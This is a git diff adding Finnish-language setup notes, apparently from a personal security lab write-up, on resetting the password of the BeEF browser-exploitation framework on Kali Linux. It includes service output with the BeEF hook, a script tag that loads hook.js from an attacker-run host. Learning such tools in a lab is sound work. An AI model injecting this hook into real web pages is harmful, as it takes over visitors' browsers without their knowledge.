@@ -72,6 +72,39 @@ Reading package lists... Done
 
 ```
 
+Mikäli jos salasana unohtuu niin polusta `cd /usr/share/beef-xss/`polusta löytyy kyseisen käyttöjärjestelmän datat ja yleensä se on `config.yaml` tiedostona. `$sudo nano` pääsee muokkaa sen tiedoston järjestelmän niin siellä näkyy millä salasananalla se on, kantsii muuttaa sitä, ja jälki käteen tallentaa tehdyt muutokset. Uudelleen käynnistä BeEF järjestelmä `└─# beef-xss-stop -h` sammuttaa ja käynnistä takas eli `└─# beef-xss-h`
+
+Sitten vaan syötät jokin uuden salsanan, ei kannatta käyttää sitä mitä muutettiin yaml tiedoston sisällä käytä jokin helppoa mikä itse muistuu mieleen
+
+```
+└─# beef-xss -h     
+[-] You are using the Default credentials
+[-] (Password must be different from "beef")
+[-] Please type a new password for the beef user: 
+[-] (Password must be different from "beef")
+[-] Please type a new password for the beef user: 
+[i] GeoIP database is missing
+[i] Run geoipupdate to download / update Maxmind GeoIP database
+[*] Please wait for the BeEF service to start.
+[*]
+[*] You might need to refresh your browser once it opens.
+[*]
+[*]  Web UI: http://127.0.0.1:3000/ui/panel
+[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
+[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+
+● beef-xss.service - beef-xss
+     Loaded: loaded (/lib/systemd/system/beef-xss.service; disabled; preset: disabled)
+     Active: active (running) since Mon 2023-05-29 05:36:47 EDT; 5s ago
+   Main PID: 673169 (ruby)
+      Tasks: 4 (limit: 2261)
+     Memory: 86.7M
+        CPU: 1.710s
+     CGroup: /system.slice/beef-xss.service
+             └─673169 ruby /usr/share/beef-xss/beef
+```
+
+
 Kali linux root:in käyttäjänä lataa ton ylemmän linkin ohjeen mukaan tulee resetoida salasanan, nii katsii antaa joku helppo jotta itse muistaa. Ladatun jälkeen kirjautuu annettun oletus IP-osoitteen mukaan (URL) linkki. 
 
 myös siinä antoi muutama vinkkiä, josta voi olla hyvä aloittaa `Web UI, Hook` ja yksi esimerkki alla
